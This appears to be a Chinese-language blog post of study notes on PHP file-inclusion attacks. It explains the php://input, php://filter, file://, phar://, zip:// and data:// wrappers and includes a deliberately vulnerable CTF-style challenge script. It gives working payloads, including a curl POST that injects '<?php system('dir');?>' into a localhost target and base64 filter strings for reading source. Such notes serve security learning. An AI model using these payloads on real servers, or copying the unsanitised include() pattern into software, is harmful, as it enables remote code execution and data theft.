---

layout: post
title: 文件包含
subtitle: 文件包含
date: 2020-08-30
author: mr_king
header-img: img/background.jpg
catalog: true
tags: 
    -文件包含
    -学习笔记
---

# 文件包含

在php.ini里有两个重要的参数allow_url_fopen和allow_url_include

allow_url_fopen:默认值是ON，允许url里的封装协议访问文件

allow_url_include:默认值是OFF,不允许包含url里的封装协议包含文件

#### php://input

php://input 是个可以访问请求的原始数据的只读流，可以读取到来自POST的原始数据。但当 enctype=”multipart/form-data” 的时候 php://input 是无效的。

**利用条件：**

1. allow_url_include = On。
2. 对allow_url_fopen不做要求。

```html
http:/xxx/index.php?file=php://input
```



**题目：**

```php
<meta charset="utf-8">
<?php
error_reporting(0);
var_dump(file_get_contents("php://input"));
$file = $_GET["file"];
if (stristr($file, "filter") || stristr($file, "zip://") || stristr($file, "phar://") || stristr($file, "data:")) {
    exit('hack');
}
if($file){
    if($file!='https://www.baidu.com'){
        echo "tips:flag在根目录下，了解php伪协议";
        include($file);
    }

}
else{
    echo '<a href="?file=http://www.baidu.com">click go baidu</a>';
}
```

```url
payload:http://127.0.0.1/include_file/include_input.php?file=php://input
--date ="<?php system('dir');?>"
```

```curl
curl -X POST -H 'Content-Type: application/x-www-form-urlencoded' -i 'http://127.0.0.1/include_file/include_input.php?file=php://input' --data '<?php system('\''dir'\'');?>'
```

## php:filter

一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.

php://filter是一种元封装器，用于数据流打开时筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用。类似readfile()、file()、file_get_contents(),在数据流读取之前没有机会使用其他过滤器。



|           名称            | 描述                                                         |
| :-----------------------: | ------------------------------------------------------------ |
| resource=<要过滤的数据流> | 这个参数是必须的。它指定了你要筛选过滤的数据流。             |
|   read=<读链的筛选列表>   | 参数可选。可以设定一个或多个过滤器名称，以管道符(\|)分隔     |
| *write=<写链的筛选列表>*  | 该参数可选。可以设定一个或多个过滤器名称，以管道符(\|)分隔   |
|  *<；两个链的筛选列表>*   | 任何没有以 *read=* 或 *write=* 作前缀 的筛选器列表会视情况应用于读或写链。 |

```curl
php://filter/[read/write]=string.[rot13/strip_tags/…..]/resource=xxx
```

filter和string过滤器连用可以对字符串进行过滤。filter的read和write参数有不同的应用场景。read用于include()和file_get_contents(),write用于file_put_contents()中。

```url
php://filter/convert.base64-[encode/decode]/resource=xxx
```

这是使用的过滤器是convert.base64-encode.它的作用就是读取upload.php的内容进行base64编码后输出。可以用于读取程序源代码经过base64编码后的数据

## **file://**

file://伪协议在双OFF的时候也可以用，用于本地文件包含

注：file://协议必须是绝对路径

## **phar://**

PHP 归档，常常跟文件包含，文件上传结合着考察。说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关。

```
phar://test.[zip/jpg/png…]/file.txt
```

其实可以将任意后缀名的文件(必须要有后缀名)，只要是zip格式压缩的，都可以进行解压，因此上面可以改为phar://test.test/file.txt也可以运行。

## **zip://,bzip2://, zlib://**

在双OFF的时候也可以用，

```
zip://test.zip%23file.txt
```

和phar://一样用于读取压缩文件，不过对于"zip://test.zip#file.txt"中的"#"要编码为"%23".因为url的#后的内容不会被传送

## **data://text/plain;base64,base编码字符串**

很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入